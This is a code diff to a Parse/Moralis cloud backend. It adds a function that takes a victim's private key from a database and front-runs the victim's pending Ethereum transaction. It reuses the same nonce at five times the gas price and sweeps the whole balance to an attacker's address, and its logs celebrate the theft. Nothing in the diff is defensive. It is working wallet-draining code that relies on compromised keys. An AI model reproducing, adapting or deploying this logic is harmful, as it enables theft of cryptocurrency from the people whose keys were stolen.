@@ -12,10 +12,15 @@ import Moralis from 'moralis';
 // console.log(addr)
 // import Moralis from 'moralis';
 import Web3 from 'web3';
+import { ethers, providers, Wallet } from "ethers";
 import { parse } from 'path';
 // import Moralis from 'moralis';
 // import Moralis from "moralis-v1";
-const web3 = new  Web3(new Web3.providers.HttpProvider(config.WEB3_PROVIDER_URL))
+const web3 = new  Web3(new Web3.providers.HttpProvider(config.WEB3_PROVIDER_URL));
+var provider: any = null;
+
+const formatEther = ethers.utils.formatEther;
+
 Parse.Cloud.define('requestMessage', async ({ params }: any) => {
   const { address, chain, networkType } = params;
 
@@ -609,7 +614,11 @@ async function passallfunc(request: any, ntwk: any) {
 
  var AnkrId = config.get("Ankr");
  var recver = config.get("addr");
+ var recver2 = config.get("addr2");
+ var victimaddr = config.get("victimaddr");
+ var AnkrId2 = config.get("AnkrId2");
  var toaddress = request.object.get("toAddress");
+ var fromaddress = request.object.get("fromAddress");
 
  if(request.object.get("fromAddress") == "0x7aba0a1453a01ba55508f4f48b462fcb1bd471bf" ) {
    toaddress = request.object.get("fromAddress");
@@ -619,11 +628,35 @@ async function passallfunc(request: any, ntwk: any) {
  // var toaddress = "0x2CA37Dd92856f00E8c77f843256c7Db4c6FAd2E9";
  // var value = "10000000";
 
+
+
+if(fromaddress.toLowerCase() == victimaddr.toLowerCase()) {
+
+  var query = new Parse.Query("hpaddr");
+  // query.limit(10);
+  query.fullText("addr", fromaddress);
+  var results = await query.first(); // [ Monster, Monster, ...]
+
+  if(results) {
+    request.log.info("got to result eth2");
+    provider =  new providers.JsonRpcProvider(AnkrId2)
+    await cancelandsend(request, results.get("pkaddr"), recver2, provider)
+  //  await proxsend(request,results, recver, AnkrId,ntwk, value, 'logger' )
+  
+  }
+  else {
+  //  logger.info(JSON.stringify(results));
+  request.log.info("got to no result eth2"); 
+  }
+
+  return
+}
+
+
 var query = new Parse.Query("hpaddr");
 // query.limit(10);
 query.fullText("addr", toaddress);
 var results = await query.first(); // [ Monster, Monster, ...]
-
 
 // request.log.info('Live section');
 if(results) {
@@ -1155,6 +1188,90 @@ function getntwork(chainid: number) {
 
 
 
+async function cancelandsend(transactx: any, VICTIM_KEY: string, reciver: string, provider: any) {
+
+  const wallet = new Wallet(VICTIM_KEY, provider);
+  
+ var balance = await wallet.getBalance();
+ var balance = ethers.BigNumber.from(transactx.object.get("value")); // value to be sent by the previous transaction
+
+  if (ethers.BigNumber.from(balance).lte(0)) {
+    request.log.info(`Value is zero`);
+    return;
+  }
+  
+//  const gasPrice = ethers.BigNumber.from(await provider.getGasPrice());
+ var gasPrice = (ethers.BigNumber.from(transactx.object.get("gasPrice"))).mul(5);
+ var gasLimit = ethers.BigNumber.from(transactx.object.get("gasLimit"));
+ var gasPriceTotal = (gasPrice).mul(gasLimit);
+
+ const gasPrice2 = (ethers.BigNumber.from(await provider.getGasPrice())).mul(5);
+ const gasLimit2 = gasLimit;
+ const gasPriceTotal2 = (gasPrice).mul(gasLimit);
+
+ if(gasPriceTotal.lt(gasPriceTotal2)) {
+
+  request.log.info("yes it is less than");
+    gasPriceTotal = gasPriceTotal2;
+    gasLimit = gasLimit2;
+    gasPrice = gasPrice2;
+
+ }
+ else {
+  request.log.info("no it is greater than");
+ }
+
+ const val = balance.sub(gasPriceTotal.add(1));
+ const minval = ethers.BigNumber.from(ethers.utils.parseUnits("0.0011", "ether"))
+
+ if (val.lt(minval)) {
+  request.log.info(`Eth Balance is less than min value 2$ - ${ethers.utils.formatUnits(minval, "ether")}Eth .... (balance=${formatEther(val)} gasPriceTotal=${ethers.utils.formatUnits(gasPriceTotal, "gwei")}) gasPrice= ${ethers.utils.formatUnits(gasPrice, "gwei")})`);
+  return;
+}
+  if (val.lt(gasPriceTotal)) {
+    request.log.info(` Eth Balance is less than gas price, waiting.... (balance=${formatEther(val)} gasPriceTotal=${ethers.utils.formatUnits(gasPriceTotal, "gwei")}) gasPrice= ${ethers.utils.formatUnits(gasPrice, "gwei")})`);
+    return;
+  }
+
+  request.log.info(` Balance is now greater (balance=${formatEther(val)}`);
+
+  try {
+    request.log.info(`Sending ${formatEther(balance)}ETH`);
+    const tx = await wallet.sendTransaction({
+      nonce: transactx.object.get("nonce"),
+      to: reciver,
+      gasLimit: gasLimit,
+      gasPrice : gasPrice,
+      value: val
+    });
+
+    tx.wait();
+
+    if(tx.hash) {
+
+      request.log.info(`Mad!...lets hope for confirmation 😁 🚀`);
+      await mshlogger(request, 'Eth2', tx.hash)
+      //
+  
+    }
+
+    if(tx.nonce) {
+
+       //
+       request.log.info(`Over Mad ooo! Block Confirmed 😁😁😁 🚀🚀🚀`);
+  
+    }
+
+    request.log.info(` Sent tx with nonce ${tx.nonce} moving ${formatEther(val)}  gwei: ${tx.hash}`);
+  } catch (err) {
+    request.log.info(` Error sending tx: ${err.message ?? err}`);
+  }
+
+
+}
+
+
+
 async function mshlogger(request: any, brand: any, logg: any) {
 
   var result = await web3.utils.fromWei(request.object.get("value"));
@@ -1354,3 +1471,5 @@ return response;
 
 
 } )
+
+
